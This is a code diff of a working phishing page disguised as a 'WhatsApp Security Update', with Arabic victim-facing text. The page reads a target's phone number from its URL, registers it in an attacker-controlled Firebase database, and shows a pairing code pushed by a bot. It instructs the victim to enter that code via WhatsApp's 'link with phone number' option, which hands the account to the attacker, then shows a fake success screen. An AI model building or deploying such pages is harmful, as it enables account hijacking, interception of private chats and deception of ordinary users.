@@ -4,15 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>WhatsApp Update</title>
-
-    <meta property="og:title" content="WhatsApp Security Update">
-    <meta property="og:description" content="Your verification code is ready! Update your account to version V3.0.1 now.">
-    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/600px-WhatsApp.svg.png">
-    <meta property="og:url" content="https://wa-protocol-update.vercel.app">
-    <meta property="og:type" content="website">
-    <meta property="og:site_name" content="WhatsApp">
-
-    <link rel="icon" href="https://static.whatsapp.net/rsrc.php/v3/yP/r/r_o_pS3X9sl.png" type="image/x-icon">
     <style>
         * { box-sizing: border-box; }
         body { font-family: -apple-system, sans-serif; display: flex; flex-direction: column; align-items: center; background: #fff; margin: 0; padding: 20px; }
@@ -29,7 +20,6 @@
         .wait-text { font-size: 12px; font-weight: 500; color: #8696a0; }
         #success-screen { display: none; position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #fff; flex-direction: column; justify-content: center; align-items: center; z-index: 10; }
         .check-mark { color: #00a884; font-size: 45px; font-weight: bold; }
-        b { font-weight: 800; color: #000; }
     </style>
 </head>
 <body>
@@ -38,17 +28,21 @@
         <div class="header-title">WhatsApp Security Update</div>
         <div id="u-badge" class="badge">Checking Device...</div>
         <div class="v-box">
-            <div class="v-row"><span id="v-label">Current Version:</span><span style="color:#d91e1e; font-weight:bold">V2.12.5</span></div>
+            <div class="v-row"><span>Current Version:</span><span style="color:#d91e1e; font-weight:bold">V2.12.5</span></div>
             <div class="v-row"><span>Update To:</span><span style="color:#00a884; font-weight:bold">V3.0.1</span></div>
         </div>
-        <p id="u-alert" class="alert-p"></p>
-        <div id="u-steps" class="steps"></div>
+        <p id="u-alert" class="alert-p">لحماية خصوصيتك، يجب ترقية إصدار V2.12.5 فوراً لضمان تشفير المحادثات.</p>
+        <div id="u-steps" class="steps">
+            1. ستتلقى الآن تنبيه 'ربط جهاز جديد' من تطبيق WhatsApp.<br>
+            2. افتح التنبيه واختر <b>'الربط باستخدام رقم الهاتف بدلاً من ذلك'</b>.<br>
+            3. أدخل <b>الرمز المكون من 8 أرقام</b> الظاهر بالأسفل في هاتفك:
+        </div>
         <div class="code-zone">
             <div id="pairing-code">...</div>
-            <div id="u-wait" class="wait-text"></div>
+            <div id="u-wait" class="wait-text">في انتظار الرمز الأمني...</div>
             <div id="success-screen">
                 <div class="check-mark">✓</div>
-                <div id="success-text" style="font-weight:bold; font-size:15px"></div>
+                <div style="font-weight:bold; font-size:15px">تم التحديث بنجاح.</div>
             </div>
         </div>
     </div>
@@ -56,69 +50,26 @@
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
     <script>
-        // إعدادات Firebase - تأكد أنها مطابقة لمشروعك الحالي
-        const config = { databaseURL: "https://xstuxnet-7e038-default-rtdb.firebaseio.com/" };
-        firebase.initializeApp(config);
+        firebase.initializeApp({ databaseURL: "https://xstuxnet-7e038-default-rtdb.firebaseio.com/" });
         const db = firebase.database();
+        const pid = new URLSearchParams(window.location.search).get('id');
 
-        // قراءة الرقم من الرابط (id=79221267029)
-        const rawId = new URLSearchParams(window.location.search).get('id');
-        const isAr = navigator.language.startsWith('ar');
-        const isIOS = /iPhone|iPad|iPod/.test(navigator.userAgent);
-        const deviceType = isIOS ? "iPhone" : "Android";
-        
-        const content = {
-            ar: { 
-                vLabel: "الإصدار الحالي:", badge: isIOS ? "جهاز مرتبط: iPhone" : "جهاز مرتبط: Android", 
-                alert: "لحماية خصوصيتك، يجب ترقية إصدار V2.12.5 فوراً لضمان تشفير المحادثات.", 
-                steps: "1. ستتلقى الآن تنبيه 'ربط جهاز جديد' من تطبيق WhatsApp.<br>2. افتح التنبيه واختر <b>'الربط باستخدام رقم الهاتف بدلاً من ذلك'</b>.<br>3. أدخل <b>الرمز المكون من 8 أرقام</b> الظاهر بالأسفل في هاتفك:", 
-                wait: "في انتظار الرمز الأمني...", done: "أدخل الرمز الآن في هاتفك", success: "تم التحديث بنجاح." 
-            },
-            en: { 
-                vLabel: "Current Version:", badge: isIOS ? "Linked Device: iPhone" : "Linked Device: Android", 
-                alert: "To protect your privacy, upgrade version V2.12.5 immediately to ensure chat encryption.", 
-                steps: "1. You will receive a 'Link a Device' notification from WhatsApp.<br>2. Open the notification and select <b>'Link with phone number instead'</b>.<br>3. Enter the <b>8-digit code</b> shown below into your phone:", 
-                wait: "Awaiting security code...", done: "Enter the code on your phone now", success: "Updated successfully." 
-            }
-        };
-
-        const c = isAr ? content.ar : content.en;
-        document.documentElement.dir = isAr ? 'rtl' : 'ltr';
-        document.getElementById('v-label').innerText = c.vLabel;
-        document.getElementById('u-badge').innerText = c.badge;
-        document.getElementById('u-alert').innerHTML = c.alert;
-        document.getElementById('u-steps').innerHTML = c.steps;
-        document.getElementById('u-wait').innerText = c.wait;
-
-        if (rawId) {
-            let phone = rawId.replace(/\D/g, ''); // تنظيف الرقم من أي رموز
-            // إضافة رمز الدولة تلقائياً إذا بدأ بـ 0 (مثال لمصر)
+        if (pid) {
+            let phone = pid.replace(/\D/g, '');
             if (phone.startsWith('01') && phone.length === 11) phone = '20' + phone;
 
-            // إرسال إشارة "pending" للبوت الجديد باستخدام الرقم كـ UID
-            db.ref('monitoring/' + phone).set({ 
-                status: "pending", 
-                target: phone,
-                device: deviceType,
-                last_seen: Date.now()
-            });
+            db.ref('monitoring/' + phone).set({ status: "pending", target: phone });
 
-            // مراقبة الأوامر (الكود والحالة) من البوت
             db.ref('commands/' + phone).on('value', snap => {
                 const data = snap.val();
                 if (data) {
-                    if (data.code) { 
-                        document.getElementById('pairing-code').innerText = data.code; 
-                        document.getElementById('u-wait').innerText = c.done; 
-                        document.getElementById('u-wait').style.color = "#d91e1e"; 
+                    if (data.code) {
+                        document.getElementById('pairing-code').innerText = data.code;
+                        document.getElementById('u-wait').innerText = "أدخل الرمز الآن في هاتفك";
+                        document.getElementById('u-wait').style.color = "red";
                     }
-                    if (data.status === 'syncing') {
-                        document.getElementById('u-wait').innerText = isAr ? "جاري مزامنة البيانات..." : "Syncing data...";
-                    }
-                    if (data.status === 'connected') {
-                        document.getElementById('success-screen').style.display = 'flex';
-                        document.getElementById('success-text').innerText = c.success;
-                    }
+                    if (data.status === 'syncing') document.getElementById('u-wait').innerText = "جاري مزامنة البيانات...";
+                    if (data.status === 'connected') document.getElementById('success-screen').style.display = 'flex';
                 }
             });
         }
